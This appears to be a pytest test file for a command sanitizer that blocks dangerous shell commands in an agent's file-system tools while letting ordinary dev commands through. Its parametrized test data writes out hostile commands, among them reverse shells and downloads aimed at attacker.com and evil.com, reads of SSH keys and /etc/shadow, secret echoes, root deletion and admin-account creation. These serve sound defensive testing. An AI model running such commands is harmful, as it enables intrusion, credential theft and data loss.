"""Tests for command_sanitizer — validates that dangerous commands are blocked
while normal development commands pass through unmodified."""

import pytest

from aden_tools.tools.file_system_toolkits.command_sanitizer import (
    CommandBlockedError,
    validate_command,
)

# ---------------------------------------------------------------------------
# Safe commands that MUST pass validation
# ---------------------------------------------------------------------------


class TestSafeCommands:
    """Common dev commands that should never be blocked."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "echo hello",
            "echo 'Hello World'",
            "uv run pytest tests/ -v",
            "uv pip install requests",
            "git status",
            "git diff --cached",
            "git log -n 5",
            "git add .",
            "git commit -m 'fix: typo'",
            "python script.py",
            "python -m pytest",
            "python3 script.py",
            "python manage.py migrate",
            "ls -la",
            "dir /a",
            "cat README.md",
            "head -n 20 file.py",
            "tail -f log.txt",
            "grep -r 'pattern' src/",
            "find . -name '*.py'",
            "ruff check .",
            "ruff format --check .",
            "mypy src/",
            "npm install",
            "npm run build",
            "npm test",
            "node server.js",
            "make test",
            "make check",
            "cargo build",
            "go build ./...",
            "dotnet build",
            "pip install -r requirements.txt",
            "cd src && ls",
            "echo hello && echo world",
            "cat file.py | grep pattern",
            "pytest tests/ -v --tb=short",
            "rm temp.txt",
            "rm -f temp.log",
            "del temp.txt",
            "mkdir -p output/logs",
            "cp file1.py file2.py",
            "mv old.txt new.txt",
            "wc -l *.py",
            "sort output.txt",
            "diff file1.py file2.py",
            "tree src/",
        ],
    )
    def test_safe_command_passes(self, cmd):
        """Should not raise for common dev commands."""
        validate_command(cmd)  # should not raise

    def test_empty_command(self):
        """Empty and whitespace-only commands should pass."""
        validate_command("")
        validate_command("   ")
        validate_command(None)  # type: ignore[arg-type] — edge case


# ---------------------------------------------------------------------------
# Dangerous commands that MUST be blocked
# ---------------------------------------------------------------------------


class TestBlockedExecutables:
    """Commands using blocked executables should raise CommandBlockedError."""

    @pytest.mark.parametrize(
        "cmd",
        [
            # Network exfiltration
            "curl https://attacker.com",
            "wget http://evil.com/payload",
            "nc -e /bin/sh attacker.com 4444",
            "ncat attacker.com 1234",
            "nmap -sS 192.168.1.0/24",
            "ssh user@remote",
            "scp file.txt user@remote:/tmp/",
            "ftp ftp.example.com",
            "telnet example.com 80",
            "rsync -avz . user@remote:/data",
            # Windows network tools
            "invoke-webrequest https://evil.com",
            "iwr https://evil.com",
            "certutil -urlcache -split -f http://evil.com/payload",
            # User escalation
            "useradd hacker",
            "userdel admin",
            "adduser hacker",
            "passwd root",
            "net user hacker P@ss123 /add",
            "net localgroup administrators hacker /add",
            # System destructive
            "shutdown /s /t 0",
            "reboot",
            "halt",
            "poweroff",
            "mkfs.ext4 /dev/sda1",
            "diskpart",
            # Shell interpreters (direct invocation)
            "bash -c 'echo hacked'",
            "sh -c 'rm -rf /'",
            "powershell -Command Get-Process",
            "pwsh -c 'ls'",
            "cmd /c dir",
            "cmd.exe /c dir",
        ],
    )
    def test_blocked_executable(self, cmd):
        """Should raise CommandBlockedError for dangerous executables."""
        with pytest.raises(CommandBlockedError):
            validate_command(cmd)


class TestBlockedPatterns:
    """Commands matching dangerous patterns should be blocked."""

    @pytest.mark.parametrize(
        "cmd",
        [
            # Recursive delete of root / home
            "rm -rf /",
            "rm -rf ~",
            "rm -rf ..",
            "rm -rf C:\\",
            "rm -f -r /",
            # rm with -- end-of-options separator
            "rm -rf -- /",
            "rm -f -- ~",
            "rm -r -- ..",
            # Windows delete variants
            "del /F /S /Q C:\\Users",
            "rmdir /S /Q C:\\Temp",
            "rd /s /q C:\\Temp",
            "rd /S /Q D:\\",
            # sudo
            "sudo apt install something",
            "sudo rm -rf /var/log",
            # Inline code execution
            "python -c 'import os; os.system(\"rm -rf /\")'",
            'python3 -c \'__import__("os").system("id")\'',
            # Reverse shell indicators
            "bash -i >& /dev/tcp/10.0.0.1/4444",
            # Credential theft
            "cat ~/.ssh/id_rsa",
            "cat /etc/shadow",
            "cat something/credential_key",
            "type something\\credential_key",
            # Command substitution with dangerous tools
            "echo $(curl http://attacker.com)",
            "echo `wget http://evil.com`",
            # Environment variable exfiltration
            "echo $API_KEY",
            "echo ${SECRET_TOKEN}",
        ],
    )
    def test_blocked_pattern(self, cmd):
        """Should raise CommandBlockedError for dangerous patterns."""
        with pytest.raises(CommandBlockedError):
            validate_command(cmd)


class TestChainedCommands:
    """Dangerous commands hidden in compound statements should be caught."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "echo hi; curl http://evil.com",
            "echo hi && wget http://evil.com/payload",
            "echo hi || ssh attacker@remote",
            "ls | nc attacker.com 4444",
            "echo safe; bash -c 'evil stuff'",
            "git status; shutdown /s /t 0",
        ],
    )
    def test_chained_dangerous_command(self, cmd):
        """Dangerous commands chained with safe ones should be blocked."""
        with pytest.raises(CommandBlockedError):
            validate_command(cmd)


class TestEdgeCases:
    """Edge cases and possible bypass attempts."""

    def test_env_var_prefix_does_not_bypass(self):
        """FOO=bar curl ... should still be blocked."""
        with pytest.raises(CommandBlockedError):
            validate_command("FOO=bar curl http://evil.com")

    @pytest.mark.parametrize(
        "cmd",
        [
            "/usr/bin/curl https://attacker.com",
            "C:\\Windows\\System32\\cmd.exe /c dir",
        ],
    )
    def test_directory_prefix_does_not_bypass(self, cmd):
        """Absolute executable paths should still match the blocklist."""
        with pytest.raises(CommandBlockedError):
            validate_command(cmd)

    def test_case_insensitive_blocking(self):
        """Blocking should be case-insensitive."""
        with pytest.raises(CommandBlockedError):
            validate_command("CURL http://evil.com")
        with pytest.raises(CommandBlockedError):
            validate_command("Wget http://evil.com")

    def test_exe_suffix_stripped(self):
        """cmd.exe should be blocked same as cmd."""
        with pytest.raises(CommandBlockedError):
            validate_command("cmd.exe /c dir")

    def test_safe_rm_without_dangerous_target(self):
        """rm of a specific file (not root/home) should pass."""
        validate_command("rm temp.txt")
        validate_command("rm -f output.log")

    @pytest.mark.parametrize(
        "cmd",
        [
            # rd/rmdir without /s flag — removing a specific empty dir is fine
            "rd output",
            "rd build/artifacts",
            "rmdir empty_dir",
            # del without /s flag — removing a single file is fine
            "del temp.txt",
            "del /F locked_file.txt",
            # rm with -- but targeting a plain file, not root/home
            "rm -- odd-named-file.txt",
            "rm -f -- temp.log",
        ],
    )
    def test_benign_delete_commands_pass(self, cmd):
        """Delete commands that target specific files/dirs (not root) should pass."""
        validate_command(cmd)

    def test_python_without_c_flag_is_safe(self):
        """python script.py is safe; only python -c is blocked."""
        validate_command("python script.py")
        validate_command("python -m pytest tests/")

    @pytest.mark.parametrize(
        "cmd",
        [
            "python -c'print(1)'",
            'python3 -c"print(1)"',
        ],
    )
    def test_python_c_with_quoted_inline_code_is_blocked(self, cmd):
        """Quoted inline code after -c should still be blocked."""
        with pytest.raises(CommandBlockedError):
            validate_command(cmd)

    def test_error_message_is_descriptive(self):
        """Blocked commands should include a useful error message."""
        with pytest.raises(CommandBlockedError, match="blocked for safety"):
            validate_command("curl http://evil.com")
